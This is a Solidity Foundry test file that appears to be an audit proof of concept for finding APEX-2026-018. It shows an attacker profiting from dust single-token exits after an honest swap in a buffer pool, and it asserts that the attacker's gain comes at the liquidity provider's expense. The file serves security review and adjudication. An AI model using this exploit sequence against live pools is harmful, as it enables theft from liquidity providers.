// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

// Business-logic adjudication variants for APEX-2026-018.
// Same primitive as BufferComputeBalanceDomain.t.sol, under:
//  - design-spec init (spec 2026-05-31 section 6.1: shares + dust TTA, virtualTTA seeded from shares),
//  - swap fee 0.05% (the value the pkg comment declares as the intended default), set by the real
//    swapFeeManager via Vault.setStaticSwapFeePercentage,
//  - plus an "organic h" test: an honest user makes the TTA->shares swap, the attacker only holds
//    dust BPT (acquired by a proportional join) and dust-exits.

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {PoolRoleAccounts} from "@crane/contracts/external/balancer/v3/interfaces/contracts/vault/VaultTypes.sol";
import {BufferComputeBalanceDomainPoC} from "./BufferComputeBalanceDomain.t.sol";

abstract contract ProdBase is BufferComputeBalanceDomainPoC {
    bool internal designInit;

    function _initPool() internal virtual override {
        if (!_design()) { super._initPool(); _setFee(); return; }
        _designInitPool();
    }

    function _design() internal pure virtual returns (bool);

    function _setFee() internal {
        PoolRoleAccounts memory ra = bv3Vault.getPoolRoleAccounts(bufferPool);
        vm.prank(ra.swapFeeManager);
        bv3Vault.setStaticSwapFeePercentage(bufferPool, 5e14);
        console2.log("static swap fee", bv3Vault.getStaticSwapFeePercentage(bufferPool));
    }

    function _designInitPool() internal {
        dai.mint(alice, INITIAL_SHARES_RAW * 2);
        usdc.mint(alice, INITIAL_SHARES_RAW * 2);
        vm.startPrank(alice);
        dai.approve(address(aeroRouter), INITIAL_SHARES_RAW * 2);
        usdc.approve(address(aeroRouter), INITIAL_SHARES_RAW * 2);
        (,, uint256 lpOut) = aeroRouter.addLiquidity(
            address(dai), address(usdc), false, INITIAL_SHARES_RAW * 2, INITIAL_SHARES_RAW * 2, 1, 1, alice,
            block.timestamp + 1 hours
        );
        IERC20(address(aeroDaiUsdcPool)).approve(address(seVault), lpOut);
        uint256 seSharesOut = seVault.deposit(lpOut, alice);
        dai.mint(alice, 1e18);
        IERC20(address(dai)).approve(address(router), type(uint256).max);
        IERC20(address(seVault)).approve(address(router), type(uint256).max);
        (IERC20[] memory poolTokens,,,) = bv3Vault.getPoolTokenInfo(bufferPool);
        uint256[] memory amounts = new uint256[](2);
        for (uint256 i; i < 2; ++i) {
            amounts[i] = address(poolTokens[i]) == address(seVault) ? seSharesOut : 1e18;
        }
        router.initialize(bufferPool, poolTokens, amounts, 0, false, bytes(""));
        vm.stopPrank();
        _setFee();
    }

    /// h comes from an honest user's TTA->shares swap. Attacker only holds dust BPT from a
    /// proportional join (no 031 overpay on entry) and dust-exits single-token to shares.
    function test_organicH_dustExits() public {
        address carol = makeAddr("carolSwapper");
        mintTTA(carol, 100e18);
        // attacker proportional join of ~0.1% of supply
        uint256 sup = bv3Vault.totalSupply(bufferPool);
        uint256 bptWant = sup / 1000;
        mintShares(attacker, 10e18);
        mintTTA(attacker, 10e18);
        vm.startPrank(attacker);
        IERC20(bufferPool).approve(address(router), type(uint256).max);
        vm.stopPrank();
        uint256 v0 = _value(attacker);
        rate0 = _rate();
        tta0 = tta.balanceOf(attacker);
        sh0 = shares.balanceOf(attacker);
        addLiquidityProportional(attacker, bptWant, type(uint128).max, type(uint128).max);
        uint256 bpt = IERC20(bufferPool).balanceOf(attacker);
        uint256 aliceBefore = _aliceProportionalValue();
        _logState("before honest swap");

        uint256 out = swapTTAforShares(carol, 100e18); // honest organic flow
        console2.log("honest swap 100 TTA -> shares", out);
        _logState("after honest swap");

        uint256 chunk = bpt / 20;
        uint256 total;
        for (uint256 i = 0; i < 20; i++) {
            uint256 o;
            try this.exitExt(chunk) returns (uint256 r) { o = r; } catch { console2.log("exit reverted at", i); break; }
            total += o;
            console2.log("exit", i, o);
        }
        uint256 rem = IERC20(bufferPool).balanceOf(attacker);
        if (rem > 0) removeLiquidityProportional(attacker, rem, 0, 0);
        _logState("after exits");
        int256 dTta = int256(tta.balanceOf(attacker)) - int256(tta0);
        int256 dSh = int256(shares.balanceOf(attacker)) - int256(sh0);
        int256 profit = dTta + dSh * int256(rate0) / 1e18;
        uint256 aliceAfter = _aliceProportionalValue();
        console2.log("attacker BPT used", bpt);
        console2.log("total shares from dust exits", total);
        console2.log("attacker PROFIT at pre-attack rate (TTA units)");
        console2.logInt(profit);
        console2.log("attacker value before/after (rate now)", v0, _value(attacker));
        console2.log("alice proportional value before/after", aliceBefore, aliceAfter);
        assertGt(profit, 0, "profit");
    }
}

/// Design-spec init. NOTE: on the isolated test Vault the only DAI reserves are this pool's 1e18 dust,
/// so the hook's mid-swap vault.sendTo(TTA) underflows; a shared production Vault would hold other reserves.
contract BufferComputeBalance_DesignInit_Fee005 is ProdBase {
    function _design() internal pure override returns (bool) { return true; }
}

/// Fixture init (live TTA present), fee set to 0.05%.
contract BufferComputeBalance_FixtureInit_Fee005 is ProdBase {
    function _design() internal pure override returns (bool) { return false; }
}
